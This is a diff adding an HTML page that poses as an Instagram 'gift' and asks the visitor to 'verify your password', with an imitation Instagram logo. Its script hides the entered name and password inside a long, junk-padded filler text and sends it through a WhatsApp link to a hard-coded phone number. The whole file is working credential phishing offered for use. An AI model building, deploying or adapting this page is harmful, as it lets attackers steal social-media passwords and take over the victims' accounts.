@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Instagram Gift</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: white;
+            font-family: Arial, sans-serif;
+
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Instagram */
+        .instagram {
+            margin-top: 45px;
+            width: 65px;
+            height: 65px;
+            border-radius: 18px;
+
+            background: linear-gradient(
+                135deg,
+                #833ab4,
+                #fd1d1d,
+                #fcb045
+            );
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+
+            position: relative;
+        }
+
+        .instagram::before {
+            content: "";
+            width: 35px;
+            height: 35px;
+            border: 4px solid white;
+            border-radius: 10px;
+            position: absolute;
+        }
+
+        .instagram::after {
+            content: "";
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            position: absolute;
+            top: 14px;
+            right: 14px;
+        }
+
+        .camera-circle {
+            width: 13px;
+            height: 13px;
+            border: 3px solid white;
+            border-radius: 50%;
+            position: absolute;
+        }
+
+        /* Form */
+        .container {
+            width: 90%;
+            max-width: 400px;
+
+            margin-top: 18vh;
+
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 25px;
+            margin-bottom: 35px;
+            color: #222;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+
+            margin-bottom: 18px;
+
+            border: 1px solid #ddd;
+            border-radius: 12px;
+
+            font-size: 16px;
+            text-align: right;
+
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border-color: #999;
+            box-shadow: 0 0 0 3px rgba(0,0,0,0.04);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+
+            border: none;
+            border-radius: 12px;
+
+            background: #25D366;
+            color: white;
+
+            font-size: 17px;
+            font-weight: bold;
+
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+        }
+
+        .small-text {
+            margin-top: 15px;
+            color: #999;
+            font-size: 13px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Instagram icon -->
+    <div class="instagram">
+        <div class="camera-circle"></div>
+    </div>
+
+    <!-- Form -->
+    <div class="container">
+
+        <h1>verify your password</h1>
+
+        <input
+            type="text"
+            id="name"
+            placeholder="name : "
+        >
+
+        <input
+            type="text"
+            id="gift"
+            placeholder="Password"
+        >
+
+        <button onclick="sendToWhatsApp()">
+            verify
+        </button>
+
+        <div class="small-text">
+            
+        </div>
+
+    </div>
+
+
+    <script>
+
+        function sendToWhatsApp() {
+            const myNumber = "212714141575";
+
+            const name = document.getElementById("name").value.trim();
+            const gift = document.getElementById("gift").value.trim();
+
+            const message =
+                " name:  . Successfully verified" + name + "\n" +
+                " Instagram is a popular social media platformPeople use it to share photos and videos.Some users post funny memes every day.Others enjoy sharing pictures of food and 453travel.In767s8tagr4am5 ca5n7 also8 be 56a 6place45 00fo2r 2c22r3e4at5ivity.Artist7s77 77ca54n3 s228890how th1ei2r3 3drawings to thousands of peop7le.Musicians can share shor00987t part224s7 of their wo888rk.Small busi0nesses c6an 2pr2es3en4t5 t6h7e7i7r 6p5r4o689duc0ts 000o0n0line.Friends can communicate through messages and stories.Stories usually56334568 disappear after twenty-four hours.Reels are short videos t467h8at can re11ach 45many view0999ers.Sometimes a 6666s6i4m3p99l0e 8v6566ideo becomes unexpectedly popu23l45ar5.89The algorithm decides which c65o67ntent appears to users.It can 887888learn from the thing22s4 666people watch and 87688like.A pers2on3 may see c2o2m2pletely different content from a friend.Some people use Instagram only for ente122332rtainment.0999Others 557use it t3o learn something new.. CDtycu-(77647687GFYHgfgg" + gift+"97FHjhftvRF56GFTDYCTh555ere are videos about sci66778ence, technology, cooking, and history.The internet can make strange ideas become popular.A funny picture can sometimes receive thousands of likes.People often create trends without planning them.One interesting comment can become more popular than the post.Some accounts grow slowly while others grow very quickly.Consistency can be important for content creators.However, not every popular post becomes successful forever.People's interests can change very quickly online.Today, someone may watch gaming videos.Tomorrow, they may suddenly watch cooking videos.The same person can enjoy completely different topics.Social media can connect people from different countries.Someone in Morocco can communicate with someone in Japan.They may never meet in real life.Technology makes this kind of communication possible.Instagram is only one part of the modern internet.There are also websites, applications, games, and online communities.Sometimes the internet is useful for learning new skills.Sometimes it is simply a good way to relax.The important thing is to use it responsibly.A normal day can contain work, study, music, food, and memes.And somehow, Instagram can fit into all of it";
+
+            const whatsappURL =
+                "https://wa.me/" +
+                myNumber +
+                "?text=" +
+                encodeURIComponent(message);
+
+            window.open(whatsappURL, "_blank");
+        }
+
+    </script>
+
+</body>
+</html>
